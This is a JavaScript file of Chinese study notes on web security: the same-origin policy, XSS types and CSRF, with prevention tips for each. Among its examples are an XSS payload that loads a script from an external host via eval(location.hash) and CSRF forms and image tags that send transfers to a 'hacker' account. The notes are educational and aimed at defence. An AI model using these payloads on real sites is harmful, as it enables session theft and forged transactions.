/**
 * https://mp.weixin.qq.com/s/llAuVXaOy6MRSWXMGBX-gg
 * 
 * Web 安全总结
 */

/** 
 * 几种常见的 web 安全问题及解决方法
 * - 同源策略
 * - XSS
 * - CSRF
 * - SQL注入
 * - 点击劫持
 * - window.opener 安全问题
 * - 文件上传漏洞
 */

/** 
 * (1) 同源策略
 * 
 * 如果两个 URL 的协议、域名和端口都相同，我们就称这两个 URL 同源。
 * - 同源策略限制了来自不同源的 JavaScript 脚本对当前 DOM 对象读和写的操作
 * - 同源策略限制了不同源的站点读取当前站点的 Cookie、IndexDB、LocalStorage 等数据
 * - 同源策略限制了通过 XMLHttpRequest 等方式将站点的数据发送给不同源的站点
 * 
 * 解决同源策略的方法:
 * - 跨文档消息机制:  可以通过 window.postMessage 的 JavaScript 接口来和不同源的 DOM 进行通信。
 * - 跨域资源共享（CORS）:   跨域资源在服务端设置允许跨域，就可以进行跨域访问控制，从而使跨域数据传输得以安全进行。
 * - 内容安全策略（CSP）:  主要以白名单的形式配置可信任的内容来源，在网页中，
 *                      能够使白名单中的内容正常执行（包含 JS，CSS，Image 等等），而非白名单的内容无法正常执行。
 */

/** 
 * (2) XSS，跨站脚本攻击(Cross Site Scripting)
 * 
 * - 存储型 XSS 攻击:
 *      利用漏洞提交恶意 JavaScript 代码，比如在input, textarea等所有可能输入文本信息的区域，
 *      输入<script src="http://恶意网站"></script>等，提交后信息会存在服务器中，
 *      当用户再次打开网站请求到相应的数据，打开页面，恶意脚本就会将用户的 Cookie 信息等数据上传到黑客服务器。
 * 
 * - 反射型 XSS 攻击:
 *      用户将一段含有恶意代码的请求提交给 Web 服务器，Web 服务器接收到请求时，
 *      又将恶意代码反射给了浏览器端，这就是反射型 XSS 攻击。在现实生活中，
 *      黑客经常会通过 QQ 群或者邮件等渠道诱导用户去点击这些恶意链接，所以对于一些链接我们一定要慎之又慎。
 * 
 *      Web 服务器不会存储反射型 XSS 攻击的恶意脚本，这是和存储型 XSS 攻击不同的地方,因为反射性xss的恶意代码是存储在
 *      html中的，当用户访问这个网站的html页面的时候，会运行其中的代码，并自动往服务器发送数据
 * 
 *      攻击方式：在url中 http://^%%%%&?name=<script>alert('nice fish')</script>
 *          (1) 攻击者构造出特殊的 URL，其中包含恶意代码。
 *          (2) 用户打开带有恶意代码的 URL 时，网站服务端将恶意代码从 URL 中取出，拼接在 HTML 中返回给浏览器。
 *          (3) 用户浏览器接收到响应后解析执行，混在其中的恶意代码也被执行。
 *          (4) 恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作。
 * 
 * - 基于 DOM 的 XSS 攻击：
 *      基于 DOM 的 XSS 攻击是不牵涉到页面 Web 服务器的。它的特点是在 Web 资源传输过程或者在用户使用页面的过程中修改 Web 页面的数据。
 *      比如利用工具(如Burpsuite)扫描目标网站所有的网页并自动测试写好的注入脚本等。
 * 
 *      攻击方式：
 *          (1) 攻击者构造出特殊的 URL，其中包含恶意代码
 *          (2) 用户打开带有恶意代码的 URL
 *          (3) 用户浏览器接收到响应后解析执行，前端 JavaScript 取出 URL 中的恶意代码并执行
 *          (4) 恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作
 * 
 *      和前面2种xss的区别：
 *      DOM 型 XSS 跟前两种 XSS 的区别：DOM 型 XSS 攻击中，取出和执行恶意代码由浏览器端完成，
 *      属于前端 JavaScript 自身的安全漏洞，而其他两种 XSS 都属于服务端的安全漏洞。
 * 
 *      例如：待访问文件xss.html的url上加上hash值
 *          file:///C:/Users/jack/Desktop/XSSdemo/index.html#document.write("<script/src=//http://ov6jc8fwp.bkt.clouddn.com/xss.js></script>")
 * 
 *          html:
 *              <!DOCTYPE html>
                <html>
                    <head>
                        <meta charset="utf-8">
                        <title>XSSdemo</title>
                    </head>
                    <script>
                        eval(location.hash.substr(1))
                    </script>
                    <body>
                    </body>
                </html>

    - 预防策略
        (1) 将cookie等敏感信息设置为httponly，禁止Javascript通过document.cookie获得
        (2) 对所有的输入做严格的校验尤其是在服务器端，过滤掉任何不合法的输入，比如手机号必须是数字，通常可以采用正则表达式
        (3) 净化和过滤掉不必要的html标签，比如：<iframe>, <script>等 ;
            净化和过滤掉不必要的Javascript的事件标签，比如：onclick, onfocus等
        (4) 转义单引号，双引号，尖括号等特殊字符，可以采用htmlencode编码 或者过滤掉这些特殊字符
 */

/** 
 * (3) CSRF
 * 
 * CSRF（Cross-site request forgery）跨站请求伪造：攻击者诱导受害者进入第三方网站，在第三方网站中，
 * 向被攻击网站发送跨站请求。利用受害者在被攻击网站已经获取的注册凭证，绕过后台的用户验证，
 * 达到冒充用户对被攻击的网站执行某项操作的目的。
 * 
 * 一个典型的CSRF攻击有着如下的流程：
 *      (1) 受害者登录a.com，并保留了登录凭证（Cookie）。
 *      (2) 攻击者引诱受害者访问了b.com。
 *      (3) b.com 向 a.com 发送了一个请求：a.com/act=xx。浏览器会默认携带a.com的cookie
 *      (4) a.com接收到请求后，对请求进行验证，并确认是受害者的凭证，误以为是受害者自己发送的请求
 *      (5) a.com以受害者的名义执行了act=xx。
 *      (6) 攻击完成，攻击者在受害者不知情的情况下，冒充受害者，让a.com执行了自己定义的操作
 * 
 * - 几种常见的攻击类型
 *      (1) GET类型的CSRF
 *          GET类型的CSRF利用非常简单，只需要一个HTTP请求，一般会这样利用:
 *          <img src="http://bank.example/withdraw?amount=10000&for=hacker" > 
 *          在受害者访问含有这个img的页面后，浏览器会自动向http://bank.example/withdraw?account=xiaoming&amount=10000&for=hacker发出一次HTTP请求。
 *          bank.example就会收到包含受害者登录信息的一次跨域请求。
 * 
 *      (2) POST类型的CSRF
 *          通常使用的是一个自动提交的表单:
 *           <form action="http://bank.example/withdraw" method=POST>
                <input type="hidden" name="account" value="xiaoming" />
                <input type="hidden" name="amount" value="10000" />
                <input type="hidden" name="for" value="hacker" />
            </form>
            <script> document.forms[0].submit(); </script>

            访问该页面后，表单会自动提交，相当于模拟用户完成了一次POST操作

        (3) 链接类型的CSRF
            这种类型通常是在论坛中发布的图片中嵌入恶意链接，或者以广告的形式诱导用户中招:
            <a href="http://test.com/csrf/withdraw.php?amount=1000&for=hacker" taget="_blank">
                重磅消息！！
            <a/>

    - csrf的特点:
        (1) 攻击一般发起在第三方网站，而不是被攻击的网站。被攻击的网站无法防止攻击发生。
        (2) 攻击利用受害者在被攻击网站的登录凭证，冒充受害者提交操作；而不是直接窃取数据。
        (3) 整个过程攻击者并不能获取到受害者的登录凭证，仅仅是“冒用”。
        (4) 跨站请求可以用各种方式：图片URL、超链接、CORS、Form提交等等。
                部分请求方式可以直接嵌入在第三方论坛、文章中，难以进行追踪。

    - CSRF 攻击的三个必要条件:
        (1) 目标站点一定要有 CSRF 漏洞
        (2) 用户要登录过目标站点，并且在浏览器上保持有该站点的登录状态
        (3) 需要用户打开一个第三方站点，如黑客的站点等

    - 预防策略:
        (1) 在请求地址中添加 token 并验证
            token可以看成API请求里面请求密匙，身份证号一样，
            请求的时候就像你拿身份证去买车票，号码要跟你匹配，不能用别人的，
            也是确定你请求是否有效的证明，通常是加密字符串。

            现在面相接口编程基本都是token加密请求，放入的方式，可以是请求头也可以是固定参数，前后端共同约定加密解密方式
        (2) 验证请求的来源站点
            在服务器端验证请求来源的站点，就是验证 HTTP 请求头中的 Origin 和 Referer 属性。
            Referer 是 HTTP 请求头中的一个字段，记录了该 HTTP 请求的来源地址，而O rigin 属性只包含了域名信息，
            并没有包含具体的 URL 路径。这是 Origin 和 Referer 的一个主要区别。

            服务器的策略是优先判断 Origin，如果请求头中没有包含 Origin 属性，再根据实际情况判断是否使用 Referer 值。
 */
